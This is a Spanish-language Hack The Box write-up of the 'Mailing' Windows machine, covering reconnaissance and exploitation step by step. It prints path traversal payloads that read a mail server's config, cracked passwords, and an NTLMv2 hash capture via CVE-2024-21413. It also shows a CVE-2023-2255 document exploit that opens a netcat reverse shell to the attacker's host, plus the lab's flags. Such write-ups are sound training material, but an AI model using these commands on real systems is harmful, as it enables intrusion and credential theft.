---
tags:
  - CTF
  - OSCP
  - windows
  - estado/completo
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/600
dificultad: Media
ip: 10.10.11.14
os: Windows
relacionados:
  - "[[swaks]]"
  - "[[Information Leakage]]"
  - "[[Cracking Hashes]]"
  - "[[Microsoft Outlook Remote Code Execution (RCE) - CVE-2024-21413]]"
  - "[[Stealing NetNTLMv2 hash]]"
  - "[[Abusing WinRM]]"
  - "[[LibreOffice Exploitation (CVE-2023-2255)]]"
  - "[[Path Traversal]]"
---
# HackTheBox - Mailing

## Reconocimiento

### Escaneo de puertos con Nmap

Para comenzar, lancé un escaneo de puertos exhaustivo con `Nmap` para identificar los servicios activos en la máquina objetivo. Utilicé una alta tasa de paquetes para agilizar el proceso.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports

nmap -sCV -p25,80,110,135,139,143,445,465,587,993,5040,5985,7680,47001,49664,49665,49666,49667,49668,50519 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

El resultado del escaneo reveló varios puertos interesantes:

```
PORT      STATE SERVICE         VERSION
25/tcp    open  smtp            hMailServer smtpd
80/tcp    open  http            Microsoft IIS httpd 10.0
110/tcp   open  pop3            hMailServer pop3d
139/tcp   open  netbios-ssn     Microsoft Windows netbios-ssn
143/tcp   open  imap            hMailServer imapd
445/tcp   open  microsoft-ds?
465/tcp   open  ssl/smtp        hMailServer smtpd
587/tcp   open  smtp            hMailServer smtpd
993/tcp   open  ssl/imap        hMailServer imapd
5985/tcp  open  http            Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
...
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Los hallazgos más relevantes fueron:
- **hMailServer** escuchando en los puertos estándar de correo (25, 110, 143, 465, 587, 993).
- Un servidor web **Microsoft IIS 10.0** en el puerto 80.
- **WinRM** disponible en el puerto 5985, lo que sugiere una posible vía de acceso si obtengo credenciales.
    
### Enumeración del servicio web

Al navegar a la dirección IP en el puerto 80, fui redirigido al dominio `mailing.htb`. Para poder acceder al sitio web, añadí la correspondiente entrada en mi archivo `/etc/hosts`.
```Bash
echo "10.10.11.14 mailing.htb" | sudo tee -a /etc/hosts
```

El sitio web parecía ser un portal informativo para un servicio de correo electrónico. Un enlace para descargar instrucciones me llamó particularmente la atención, ya que podría ser un punto de entrada.

## Análisis de vulnerabilidades

### Path Traversal en el portal web

Al analizar la URL del enlace de descarga, observé que utilizaba un parámetro `file` para especificar el documento a servir:

`http://mailing.htb/download.php?file=instructions.pdf`

Esta implementación es un candidato clásico para una vulnerabilidad de **Path Traversal**. Si la aplicación no sanea correctamente la entrada del usuario, podría ser posible navegar por el sistema de archivos del servidor y leer ficheros arbitrarios.

> [!bug] Vulnerabilidad: Path Traversal (Recorrido de Directorios)
> 
> Esta vulnerabilidad ocurre cuando una aplicación web utiliza la entrada del usuario para construir la ruta de un archivo que será leído o escrito. Un atacante puede manipular esta entrada, utilizando secuencias como ../ o rutas absolutas, para acceder a archivos y directorios fuera del directorio web raíz. Esto puede exponer ficheros de configuración, código fuente o credenciales sensibles.

Para confirmar la vulnerabilidad, intenté leer un archivo conocido del sistema, como el fichero `hosts` de Windows, usando la siguiente carga útil:

`..\..\Windows\System32\drivers\etc\hosts`

El éxito de esta prueba confirmó la existencia de la vulnerabilidad de Path Traversal.

## Explotación de vulnerabilidades

### Obteniendo la contraseña del administrador de hMailServer

Aprovechando la vulnerabilidad de Path Traversal, mi siguiente objetivo era leer el archivo de configuración de **hMailServer**, que según la documentación se encuentra en `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini`.

Construí la siguiente carga útil codificada para la URL:

`..\..\..\Program+Files+(x86)\hMailServer\Bin\hMailServer.ini`

Al acceder a la URL manipulada, el servidor me devolvió el contenido del fichero `.ini`, que contenía el hash de la contraseña del usuario `Administrator`:
```Ini, TOML
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
```

Procedí a descifrar el hash (que parecía ser MD5) usando una herramienta online.

> [!success] Contraseña Obtenida
> 
> La contraseña para el usuario Administrator del servidor de correo es: homenetworkingadministrator

### Capturando y descifrando el hash de Maya

Con las credenciales del administrador de `hMailServer`, ya podía poner en marcha el ataque para explotar **CVE-2024-21413**.

Primero, cloné el repositorio del PoC:
```Bash
git clone https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability
```

Luego, inicié un servidor SMB con `impacket-smbserver` para escuchar las conexiones entrantes y capturar el hash.
```Bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

A continuación, utilicé el script del PoC para enviar un correo electrónico desde `administrator@mailing.htb` a `maya@mailing.htb` (una suposición lógica basada en los nombres del equipo en la web). El correo contenía un enlace que apuntaba a mi servidor SMB.
```Bash
$ python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password 'homenetworkingadministrator' --sender administrator@mailing.htb --recipient maya@mailing.htb --url "\\<MI_IP>\smbFolder\test.txt" --subject Test
```

Poco después, recibí una conexión en mi servidor SMB, revelando el hash NTLMv2 del usuario `maya`.

```
[*] Incoming connection (10.10.11.14,53938)
[*] AUTHENTICATE_MESSAGE (MAILING\maya,MAILING)
[*] User MAILING\maya authenticated successfully
[*] maya::MAILING:aaaaaaaaaaaaaaaa:60f6b238b0a3e2756d6d1e3599 {** SNIP **}
```

Guardé el hash completo en un archivo y usé **John The Ripper** con el diccionario `rockyou.txt` para descifrarlo.
```Bash
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

> [!success] Contraseña Obtenida
> 
> La contraseña para el usuario maya es: m4y4ngs4ri

### Acceso inicial como el usuario 'maya'

Con las credenciales de `maya`, finalmente pude establecer una sesión interactiva en la máquina a través de **WinRM** usando `evil-winrm`.
```Bash
evil-winrm -u maya -p m4y4ngs4ri -i mailing.htb

*Evil-WinRM* PS C:\Users\maya> whoami
mailing\maya
```

Confirmé mi acceso y procedí a leer la bandera de usuario ubicada en su escritorio.

## Escalada de privilegios

### Explotando LibreOffice para obtener una shell como 'localadmin'

Una vez dentro como `maya`, mi primer paso fue confirmar la versión de LibreOffice para asegurarme de que era vulnerable.
```PowerShell
*Evil-WinRM* PS C:\> type "C:\program files\libreoffice\program\version.ini"
[Version]
MsiProductVersion=7.4.0.1
```

La versión 7.4.0.1 era, en efecto, vulnerable a **CVE-2023-2255**. Utilicé un PoC disponible públicamente para generar un documento `.odt` malicioso.
```Bash
git clone https://github.com/elweth-sec/CVE-2023-2255.git
python3 CVE-2023-2255.py --cmd "cmd.exe /c C:\ProgramData\nc.exe -e cmd.exe <MI_IP> 443" --output exploit.odt
```

Este comando creó el archivo `exploit.odt`, que al abrirse ejecutaría una reverse shell hacia mi máquina en el puerto 443 usando `nc.exe`.

Necesitaba subir tanto `nc.exe` como el documento `exploit.odt` a la máquina víctima. Decidí colocar `nc.exe` en un directorio de escritura pública como `C:\ProgramData`.
```PowerShell
*Evil-WinRM* PS C:\programdata> upload nc.exe
```

Tras una breve enumeración de directorios, encontré una carpeta llamada `C:\Important Documents`. Su nombre sugería que era un lugar monitoreado o utilizado con frecuencia, convirtiéndolo en el lugar perfecto para dejar mi archivo malicioso.
```PowerShell
*Evil-WinRM* PS C:\> cd "C:\Important Documents"
*Evil-WinRM* PS C:\important documents> upload exploit.odt
```

Inicié un listener de `netcat` en mi máquina local.
```Bash
$ nc -nvlp 443
```

Aproximadamente un minuto después, un usuario (presumiblemente `localadmin` o un proceso automatizado con sus privilegios) abrió el documento, y recibí una conexión inversa.
```Bash
$ nc -nvlp 443
listening on [any] 443 ...
connect to [<MI_IP>] from (UNKNOWN) [10.10.11.14] 50405
Microsoft Windows [Version 10.0.19045.4355]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\LibreOffice\program> whoami
mailing\localadmin
```

Con privilegios de `localadmin`, pude leer la bandera final en el escritorio de este usuario.


---

## Bandera(s)

> [!FLAG] `flag{user}`
> 444cbcb0c77f7cc3d6ff3a1245f0c01b
^bandera

> [!FLAG] `flag{root}`
> 5c79940efa5d7dab23eae2c03bdaf666
^bandera